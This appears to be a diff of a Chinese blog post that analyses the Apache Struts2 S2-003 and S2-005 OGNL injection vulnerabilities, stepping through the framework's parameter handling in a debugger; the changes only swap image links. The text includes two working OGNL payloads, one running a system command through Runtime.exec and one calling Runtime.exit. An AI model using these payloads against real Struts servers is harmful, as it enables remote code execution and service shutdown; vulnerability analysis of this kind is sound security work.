@@ -8,44 +8,44 @@
 <p>选取网上常见的POC作调试用:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&apos;)(kxlzx)(kxlzx)&amp;(&apos;\u0023mycmd\u003d\&apos;ipconfig\&apos;&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&apos;)(bla)(bla)&amp;(A)((&apos;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&apos;)(bla))&amp;(B)((&apos;\u0023myres\u003dnew\40byte[51020]&apos;)(bla))&amp;(C)((&apos;\u0023mydat.readFully(\u0023myres)&apos;)(bla))&amp;(D)((&apos;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&apos;)(bla))&amp;(&apos;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&apos;)(bla)(bla)&amp;(E)((&apos;\u0023myout.getWriter().println(\u0023mystr)&apos;)(bla))</span><br></pre></td></tr></table></figure>
 <p>从官网的<a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">S2-003公告</a>分析，触发点位于<code>ParametersInterceptor</code>，注意调试showcase要先把断点位置打好，否则会出现调试不出现源码的情况。</p>
-<p><img src="/img/S2003-1.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/Znf7W9.jpg" alt></p>
 <p><code>step over</code>到<code>getValueStack()</code>断点位置，看一下变量情况:</p>
-<p><img src="/img/S2003-2.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/ZnfTJJ.jpg" alt></p>
 <p><code>parameters</code>正常赋值，<code>step into</code>进入<code>setParameters()</code>:</p>
-<p><img src="/img/S2003-3.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/ZnfhZT.jpg" alt></p>
 <p>经过循环取值后，会依次处理传入的参数:</p>
-<p><img src="/img/S2003-4.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/Znf5oF.jpg" alt></p>
 <p><code>entry</code>被赋值后，进阶着便赋值给了<code>name</code>，而接下来则会对<code>name</code>进行格式校验，跟入<code>acceptableName</code>:</p>
-<p><img src="/img/S2003-5.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/Znf2Mq.jpg" alt></p>
 <p>此处会检验是否存在<code>=</code>,<code>,</code>,<code>#</code>,<code>:</code>这些符号，存在的话便返回<code>-1</code>，而<code>-1</code>则无法继续执行接下来的语句。</p>
 <p>在109行调用<code>setValue()</code>:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    stack.setValue(name, value);</span><br><span class="line">&#125; <span class="keyword">catch</span> (RuntimeException var14) &#123;</span><br><span class="line">    Boolean devMode = (Boolean)stack.getContext().get(<span class="string">"__devMode"</span>);</span><br><span class="line">    <span class="keyword">if</span> (devMode != <span class="keyword">null</span> &amp;&amp; devMode) &#123;</span><br><span class="line">        String developerNotification = LocalizedTextUtil.findText(ParametersInterceptor.class, <span class="string">"webwork.messages.devmode.notification"</span>, ActionContext.getContext().getLocale(), <span class="string">"Developer Notification (set webwork.devMode to false to disable this message):\n&#123;0&#125;"</span>, <span class="keyword">new</span> Object[]&#123;var14.getMessage()&#125;);</span><br><span class="line">        LOG.error(developerNotification);</span><br><span class="line">        <span class="keyword">if</span> (action <span class="keyword">instanceof</span> ValidationAware) &#123;</span><br><span class="line">            ((ValidationAware)action).addActionMessage(developerNotification);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        LOG.error(<span class="string">"ParametersInterceptor - [setParameters]: Unexpected Exception catched: "</span> + var14.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>步入<code>setValue()</code>:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(String expr, Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.setValue(expr, value, <span class="keyword">this</span>.isDevModeEnabled());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>继续步入<code>setValue</code>:</p>
-<p><img src="/img/S2003-6.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/Znfczn.jpg" alt></p>
 <p>步入第110行处的<code>OgnlUtil.setValue(expr, context, this.root, value)</code>:</p>
-<p><img src="/img/S2003-7.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/Znf4dU.jpg" alt></p>
 <p>步入<code>compile</code>:</p>
-<p><img src="/img/S2003-8.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/Znf6Rs.jpg" alt></p>
 <p>进入<code>Ognl.parseExpression(express)</code>:</p>
-<p><img src="/img/S2003-9.jpg" alt></p>
-<p><img src="/img/S2003-10.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/ZnfWLV.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/ZnfsiQ.jpg" alt></p>
 <p><code>expression</code>函数中的逻辑主要为进行字符处理，而<code>\u0023</code>转变为<code>#</code>则在它调用<code>readChar()</code>函数进行处理时完成，当遇到<code>\</code>与<code>u</code>时，将后续的数字处理为十六进制:</p>
-<p><img src="/img/S2003-11.png" alt></p>
-<p><img src="/img/S2003-12.png" alt></p>
-<p><img src="/img/S2003-13.png" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/ZnfDIg.png" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/ZnfyGj.png" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/Znfdqf.png" alt></p>
 <p>从<code>Variables</code>中可以看到，已经完成了<code>\u0023</code>到<code>#</code>的转变.下图为完成字符处理后，返回<code>compile</code>的结果:</p>
-<p><img src="/img/S2003-14.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/Znf0Z8.jpg" alt></p>
 <p>以上语句最终在<code>evaluateGetValueBody</code>函数中进行执行:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">evaluateGetValueBody</span><span class="params">(OgnlContext context, Object source)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">    context.setCurrentObject(source);</span><br><span class="line">    context.setCurrentNode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.constantValueCalculated) &#123;</span><br><span class="line">        <span class="keyword">this</span>.constantValueCalculated = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">this</span>.hasConstantValue = <span class="keyword">this</span>.isConstant(context);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.hasConstantValue) &#123;</span><br><span class="line">            <span class="keyword">this</span>.constantValue = <span class="keyword">this</span>.getValueBody(context, source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hasConstantValue ? <span class="keyword">this</span>.constantValue : <span class="keyword">this</span>.getValueBody(context, source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="延伸至s2-005"><a class="markdownIt-Anchor" href="#延伸至s2-005"></a> 延伸至S2-005</h2>
 <p>在出现S2-003后，官方采用的修补方法为:</p>
-<p><img src="/img/S2003-15.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/ZnfasP.jpg" alt></p>
 <p>正如公告所说的，这不是一个很好的解决方式，因此也直接导致了S2-005的产生，仅需要对<code>allowStaticMethodAccess</code>及<code>denyMethodExecution</code>属性重新进行设置即可重新利用上下文.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\u0023_memberAccess[\&apos;allowStaticMethodAccess\&apos;]&apos;)(meh)=true&amp;(aaa)((&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003d\u0023foo&apos;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&apos;\u0023rt.exit(1)&apos;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
 <p>而对于S2-005，官方则直接建议升级至Struts 2.2.1:</p>
-<p><img src="/img/S2003-16.jpg" alt></p>
+<p><img src="https://s2.ax1x.com/2019/06/27/ZnfBdS.jpg" alt></p>
 </article><div id="paginator"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Meizj </span><span>using    </span><a href="https://github.com/meizjm3i/Meizj"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script>$(window).on('load', function(){ 
 $('pre').addClass('prettyprint linenums');
 prettyPrint();
